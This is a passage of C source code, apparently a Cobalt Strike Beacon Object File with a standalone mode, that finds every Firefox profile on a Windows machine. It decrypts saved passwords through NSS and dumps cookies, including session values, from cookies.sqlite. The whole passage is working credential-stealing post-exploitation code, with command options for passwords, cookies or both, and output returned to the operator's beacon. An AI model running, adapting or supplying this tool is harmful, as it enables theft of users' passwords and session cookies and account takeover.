        "SELECT host, path, name, value, encryptedValue FROM moz_cookies LIMIT 50",
        -1, &stmt, NULL);
    if (result != SQLITE_OK) {
        p_sqlite3_close(db);
        return FALSE;
    }

    SafeAppend("\n[+] Cookies:\n");
    SafeAppend("================================\n");

    while ((result = p_sqlite3_step(stmt)) == SQLITE_ROW && count < MAX_ENTRIES_PER_TYPE) {
        const char* host = (const char*)p_sqlite3_column_text(stmt, 0);
        const char* path = (const char*)p_sqlite3_column_text(stmt, 1);
        const char* name = (const char*)p_sqlite3_column_text(stmt, 2);
        const char* value = (const char*)p_sqlite3_column_text(stmt, 3);
        const BYTE* encValue = (const BYTE*)p_sqlite3_column_blob(stmt, 4);
        int encValueLen = p_sqlite3_column_bytes(stmt, 4);

        if (value && MSVCRT$strlen(value) > 0) {
            SafeAppend("Host: %s | Path: %s | Name: %s | Value: %s\n",
                      host ? host : "", path ? path : "", name ? name : "", value);
        } else if (encValue && encValueLen > 0 && nssInitialized && p_PK11SDR_Decrypt) {
            char* encB64 = (char*)intAlloc(encValueLen + 1);
            if (encB64) {
                MSVCRT$memcpy(encB64, encValue, encValueLen);
                encB64[encValueLen] = '\0';
                char* decValue = NULL;
                if (DecryptWithNSS(encB64, &decValue)) {
                    SafeAppend("Host: %s | Path: %s | Name: %s | Value: %s\n",
                              host ? host : "", path ? path : "", name ? name : "", decValue);
                    if (decValue) intFree(decValue);
                } else {
                    SafeAppend("Host: %s | Path: %s | Name: %s | Value: (encrypted, failed to decrypt)\n",
                              host ? host : "", path ? path : "", name ? name : "");
                }
                intFree(encB64);
            }
        } else if (encValue && encValueLen > 0) {
            SafeAppend("Host: %s | Path: %s | Name: %s | Value: (encrypted, NSS not available)\n",
                      host ? host : "", path ? path : "", name ? name : "");
        }
        count++;
    }

    SafeAppend("\n[+] Extracted %d cookies\n", count);

    if (stmt) p_sqlite3_finalize(stmt);
    if (db) p_sqlite3_close(db);
    return (result == SQLITE_DONE || result == SQLITE_OK);
}

static BOOL IsActiveProfile(const char* profilePath) {
    int keyType = DetectKeyDatabase(profilePath);
    BOOL hasLogins = HasLoginsJson(profilePath) || HasSignonsSqlite(profilePath);
    return (keyType != PROFILE_KEY_NONE && hasLogins);
}

static BOOL ProcessProfile(const char* profilePath, BOOL extractPasswords, BOOL extractCookies) {
    char loginsJsonPath[MAX_PATH] = {0};
    char cookiesDbPath[MAX_PATH] = {0};
    char signonsPath[MAX_PATH] = {0};
    BOOL nssReady = FALSE;
    int keyType = PROFILE_KEY_NONE;

    if (!IsActiveProfile(profilePath)) {
        SafeAppend("[!] Profile appears inactive (missing key db or logins) - skipping\n");
        return FALSE;
    }

    keyType = DetectKeyDatabase(profilePath);

    SafeAppend("[*] Processing Profile: %s\n", profilePath);
    SafeAppend("[*] Key database: %s\n",
              keyType == PROFILE_KEY4_DB ? "key4.db (modern)" :
              keyType == PROFILE_KEY3_DB ? "key3.db (legacy)" : "unknown");

    if (extractPasswords) {
        nssReady = InitializeNSS(profilePath);
        if (!nssReady) {
            SafeAppend("[!] NSS initialization failed - passwords will be shown encrypted\n");
            SafeAppend("[!] Possible causes: Firefox not installed, master password set, or NSS version mismatch\n");
        }
    }

    MSVCRT$strcpy(loginsJsonPath, profilePath);
    MSVCRT$strcat(loginsJsonPath, "\\logins.json");

    MSVCRT$strcpy(cookiesDbPath, profilePath);
    MSVCRT$strcat(cookiesDbPath, "\\cookies.sqlite");

    MSVCRT$strcpy(signonsPath, profilePath);
    MSVCRT$strcat(signonsPath, "\\signons.sqlite");

    if (extractPasswords) {
        if (KERNEL32$GetFileAttributesA(loginsJsonPath) != INVALID_FILE_ATTRIBUTES) {
            ExtractPasswordsFromLoginsJson(loginsJsonPath, profilePath, nssReady);
        } else if (KERNEL32$GetFileAttributesA(signonsPath) != INVALID_FILE_ATTRIBUTES) {
            ExtractPasswordsFromSignonsSqlite(profilePath, nssReady);
        } else {
            SafeAppend("[!] No password store found (logins.json or signons.sqlite)\n");
        }
    }

    if (extractCookies && KERNEL32$GetFileAttributesA(cookiesDbPath) != INVALID_FILE_ATTRIBUTES) {
        ExtractCookies(cookiesDbPath, profilePath, nssReady);
    }

    if (nssReady && p_NSS_Shutdown) {
        p_NSS_Shutdown();
        nssInitialized = FALSE;
    }

    return TRUE;
}

static BOOL ExtractFirefoxData(BOOL extractPasswords, BOOL extractCookies) {
    int i = 0;

    SafeAppend("\n[*] Extracting Firefox Data from All Profiles\n");
    SafeAppend("================================\n");

    if (!FindAllFirefoxProfiles()) {
        SafeAppend("[!] No Firefox profiles found\n");
        return FALSE;
    }

    SafeAppend("[+] Found %d Firefox profile(s)\n\n", profileCount);

    for (i = 0; i < profileCount; i++) {
        ProcessProfile(profilePaths[i], extractPasswords, extractCookies);
    }

    SafeAppend("\n[*] Completed processing %d profile(s)\n", profileCount);

    return TRUE;
}

#ifdef BOF
VOID go(IN PCHAR Buffer, IN ULONG Length) {
    datap parser;
    CHAR* option = NULL;
    CHAR* allocatedOption = NULL;
    BOOL extractPasswords = TRUE;
    BOOL extractCookies = FALSE;

    if (!bofstart()) {
        return;
    }

    BeaconDataParse(&parser, Buffer, Length);
    option = BeaconDataExtract(&parser, NULL);

    if (option == NULL && Length > 0 && Length < 256) {
        allocatedOption = (CHAR*)intAlloc(Length + 1);
        if (allocatedOption != NULL) {
            MSVCRT$memcpy(allocatedOption, Buffer, Length);
            allocatedOption[Length] = '\0';
            option = allocatedOption;
        }
    }

    if (option != NULL) {
        char optionLower[256] = {0};
        int i = 0;
        for (i = 0; option[i] != '\0' && i < 255; i++) {
            if (option[i] >= 'A' && option[i] <= 'Z') {
                optionLower[i] = option[i] + 32;
            } else {
                optionLower[i] = option[i];
            }
        }
        optionLower[i] = '\0';

        if (MSVCRT$_stricmp(optionLower, "/all") == 0 || MSVCRT$_stricmp(optionLower, "all") == 0) {
            extractPasswords = TRUE;
            extractCookies = TRUE;
        }
        else if (MSVCRT$_stricmp(optionLower, "/cookies") == 0 || MSVCRT$_stricmp(optionLower, "cookies") == 0) {
            extractPasswords = FALSE;
            extractCookies = TRUE;
        }
    }

    if (!LoadSQLiteFunctions()) {
        SafeAppend("[!] Failed to load SQLite DLL. Make sure winsqlite3.dll is available.\n");
        SafeAppend("[!] Cookie extraction and legacy signons.sqlite will not work.\n");
    }

    ExtractFirefoxData(extractPasswords, extractCookies);

    printoutput(TRUE);

    if (hSqlite3) {
        KERNEL32$FreeLibrary(hSqlite3);
        hSqlite3 = NULL;
    }

    if (nssInitialized && p_NSS_Shutdown) {
        p_NSS_Shutdown();
        nssInitialized = FALSE;
    }
    if (hNss3) {
        KERNEL32$FreeLibrary(hNss3);
        hNss3 = NULL;
    }

    if (allocatedOption) intFree(allocatedOption);
    bofstop();
}
#else
int main(int argc, char* argv[]) {
    BOOL extractPasswords = TRUE;
    BOOL extractCookies = FALSE;

    if (argc > 1) {
        if (MSVCRT$_stricmp(argv[1], "/all") == 0 || MSVCRT$_stricmp(argv[1], "all") == 0) {
            extractPasswords = TRUE;
            extractCookies = TRUE;
        } else if (MSVCRT$_stricmp(argv[1], "/cookies") == 0 || MSVCRT$_stricmp(argv[1], "cookies") == 0) {
            extractPasswords = FALSE;
            extractCookies = TRUE;
        }
    }

    if (!LoadSQLiteFunctions()) {
        printf("[!] Failed to load SQLite DLL\n");
    }

    ExtractFirefoxData(extractPasswords, extractCookies);
    return 0;
}
#endif
